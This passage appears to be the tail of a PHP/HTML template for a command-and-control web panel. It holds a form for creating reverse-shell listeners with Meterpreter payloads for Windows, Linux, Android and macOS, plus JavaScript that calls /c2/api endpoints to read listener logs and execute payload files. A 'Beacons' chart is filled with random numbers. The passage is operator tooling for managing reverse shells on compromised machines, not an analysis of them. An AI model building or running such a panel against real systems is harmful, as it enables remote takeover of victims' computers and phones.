    <!-- Listener Modal -->
    <div id="listenerModal" class="modal">
        <div class="modal-content">
            <span onclick="closeModal()" style="float:right; color:#f00; font-size:2em; cursor:pointer;">&times;</span>
            <h2 style="color:var(--cosmic-neon-green);">➕ Create Listener</h2>
            <form method="post">
                <input type="hidden" name="csrf_token" value="<?= e($_SESSION['csrf_token']) ?>">
                <input type="hidden" name="action" value="create_listener">
                <div style="margin-bottom:15px;">
                    <label>Name:</label>
                    <input type="text" name="name" required style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:10px;">
                </div>
                <div style="margin-bottom:15px;">
                    <label>Protocol:</label>
                    <select name="protocol" style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:10px;">
                        <option value="tcp">TCP</option>
                        <option value="http">HTTP</option>
                        <option value="https">HTTPS</option>
                    </select>
                </div>
                <div style="margin-bottom:15px;">
                    <label>Payload Type:</label>
                    <select name="payload_type" style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:10px;">
                        <option value="generic/shell_reverse_tcp">Generic Shell Reverse TCP</option>
                        <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
                        <option value="linux/x86/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
                        <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
                        <option value="osx/x64/meterpreter/reverse_tcp">macOS Meterpreter Reverse TCP</option>
                        <option value="tcp_raw">TCP Raw (netcat)</option>
                    </select>
                </div>
                <div style="margin-bottom:15px;">
                    <label>LHOST:</label>
                    <input type="text" name="lhost" value="0.0.0.0" required style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:10px;">
                </div>
                <div style="margin-bottom:15px;">
                    <label>LPORT:</label>
                    <input type="number" name="lport" value="4444" required style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:10px;">
                </div>
                <button type="submit" class="btn btn-primary">✅ Create</button>
            </form>
        </div>
    </div>

    <script>
        const csrfToken = '<?= e($_SESSION['csrf_token']) ?>';

        function openTaskModal(uuid) {
            document.getElementById('task-payload-uuid').value = uuid;
            document.getElementById('taskModal').style.display = 'block';
        }

        function closeModal() {
            document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
        }

        function viewListenerLog(id) {
            fetch('/c2/api/listener_log.php?id=' + id, {
                headers: { 'X-CSRF-Token': csrfToken }
            })
            .then(r => r.text())
            .then(log => alert('Listener Log:\n' + log))
            .catch(err => alert('Error: ' + err));
        }

        function executePayload(filename) {
            if (!confirm('Execute ' + filename + ' on local machine? This will run the payload.')) return;
            fetch('/c2/api/execute_payload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'filename=' + encodeURIComponent(filename) + '&csrf=' + encodeURIComponent(csrfToken)
            })
            .then(r => r.json())
            .then(data => {
                alert('Execution result: ' + (data.output || 'No output') + '\nExit code: ' + data.exit_code);
                if (data.status === 'success') {
                    setTimeout(() => location.reload(), 2000);
                }
            })
            .catch(err => alert('Error: ' + err));
        }

        window.onload = function() {
            const ctx = document.getElementById('trafficChart')?.getContext('2d');
            if (ctx) {
                new Chart(ctx, {
                    type: 'line',
                    data: {
                        labels: Array.from({length:24}, (_,i) => i+'h'),
                        datasets: [{
                            label: 'Beacons',
                            data: Array.from({length:24}, () => Math.floor(Math.random()*10)),
                            borderColor: '#00ff9d',
                            backgroundColor: 'rgba(0,255,157,0.1)',
                            tension: 0.4
                        }]
                    },
                    options: {
                        scales: { y: { beginAtZero: true, grid: { color: 'rgba(0,255,255,0.1)' } } },
                        plugins: { legend: { labels: { color: '#0ff' } } }
                    }
                });
            }
        };
    </script>
</body>
</html>
